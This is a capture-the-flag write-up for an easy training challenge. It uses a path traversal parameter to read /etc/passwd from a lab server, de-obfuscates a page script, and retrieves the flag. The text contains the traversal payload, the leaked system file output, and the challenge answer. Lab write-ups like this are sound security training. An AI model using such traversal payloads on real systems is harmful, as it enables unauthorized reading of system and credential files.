---
Name: "Traverse Universe"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Using path traversal to access files outside the intended application directory."
---

# Traverse Universe
We see it loads planets with ?planet=example.php. We test for path traversal and see that it's successful

```http
http://141.85.224.101:30022/planetarium/index.php?planet=../../../../../../../../../../../etc/passwd
```

```txt
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Inspecting the page source shows a script which has the path to the flag

```javascript
var _0x5c09=['dot-php','earth\x20','log','slash\x20','dot-dot-slash\x20','flag\x20','NASA\x20'];(function(_0xe916b7,_0x5c0933){var _0x34f1b0=function(_0x4a989c){while(--_0x4a989c){_0xe916b7['push'](_0xe916b7['shift']());}};_0x34f1b0(++_0x5c0933);}(_0x5c09,0xa1));var _0x34f1=function(_0xe916b7,_0x5c0933){_0xe916b7=_0xe916b7-0x0;var _0x34f1b0=_0x5c09[_0xe916b7];return _0x34f1b0;};var algf=_0x34f1('0x4')+_0x34f1('0x1')+_0x34f1('0x3')+'moon\x20'+'slash\x20'+_0x34f1('0x6')+_0x34f1('0x3')+_0x34f1('0x5')+_0x34f1('0x0');console[_0x34f1('0x2')](algf);
```

We run it and we get it

```txt
dot-dot-slash earth slash moon slash NASA slash flag dot php
```

```http
?planet=../earth/moon/NASA/flag.php
```

```txt
SSS{t0_the_m00n_and_back}
```

